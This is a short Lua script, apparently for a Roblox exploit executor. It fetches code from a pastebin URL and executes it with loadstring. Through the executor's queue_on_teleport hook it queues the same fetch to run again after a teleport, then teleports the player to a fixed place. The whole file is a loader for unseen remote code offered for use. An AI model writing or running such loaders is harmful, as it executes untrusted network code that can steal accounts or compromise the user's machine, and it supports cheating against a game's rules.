repeat task.wait() until game:IsLoaded()
loadstring(game:HttpGet("https://pastebin.com/raw/6yYuhgsA"))()


local queue_on_teleport = queue_on_teleport or syn and syn.queue_on_teleport 
queue_on_teleport[[repeat wait() until game:IsLoaded() loadstring(game:HttpGet("https://pastebin.com/raw/6yYuhgsA"))()]]


wait(1)

local ts = game:GetService("TeleportService")

local p = game:GetService("Players").LocalPlayer


ts:Teleport(14682939953, p)
